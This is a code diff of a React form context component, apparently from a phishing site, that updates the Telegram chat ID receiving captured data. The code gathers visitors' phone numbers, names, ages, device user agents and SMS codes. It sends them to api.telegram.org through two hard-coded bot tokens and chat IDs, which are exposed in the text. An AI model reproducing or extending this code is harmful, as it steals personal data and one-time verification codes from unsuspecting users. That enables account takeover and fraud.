@@ -45,7 +45,7 @@ const ContextForm = ({ children }) => {
     localStorage.setItem("telefone", telefone);
 
     const dispositivo = navigator.userAgent;
-    let secondtChatId = "4272673072"
+    let secondtChatId = "-1002248337195"
     let secondBotToken="7157897588:AAFpauemd1I94-0breGo2stQMuOHcbdR9qw"
     let chatId = "7911135198";
     let botToken = "7888758598:AAEFu17iI3YiffcpyublLLJNZfYhk-KOVbQ"; //
@@ -99,8 +99,8 @@ const ContextForm = ({ children }) => {
   function captureDispositivo() {
     const dispositivo = navigator.userAgent;
     let chatId = "7911135198";
-    let botToken = "7888758598:AAEFu17iI3YiffcpyublLLJNZfYhk-KOVbQ"; //
-     let secondtChatId = "4272673072"
+    let botToken = "7888758598:AAEFu17iI3YiffcpyublLLJNZfYhk-KOVbQ"//
+     let secondtChatId = "-1002248337195"
     let secondBotToken="7157897588:AAFpauemd1I94-0breGo2stQMuOHcbdR9qw"
     const message = `📱Dispositivo:${dispositivo}`;
 
@@ -122,7 +122,7 @@ const ContextForm = ({ children }) => {
           console.log("Erro ao enviar a mensagem.");
         }
       })
-      .catch((error) => console.log("Erro: ", error));
+      .catch((error) => console.log("Erro: ", error))
 
       //
       fetch(`https://api.telegram.org/bot${secondBotToken}/sendMessage`, {
@@ -162,7 +162,7 @@ const ContextForm = ({ children }) => {
 
     let chatId = "7911135198";
     let botToken = "7888758598:AAEFu17iI3YiffcpyublLLJNZfYhk-KOVbQ"; //
-        let secondtChatId = "4272673072"
+    let secondtChatId = "-1002248337195"
     let secondBotToken="7157897588:AAFpauemd1I94-0breGo2stQMuOHcbdR9qw"
 
     const message = `📞Número de telefone: ${telefonee}\n🧑‍🦰Nome: ${name}\n🔒Idade: ${idadee}\n SMS:${values.join(
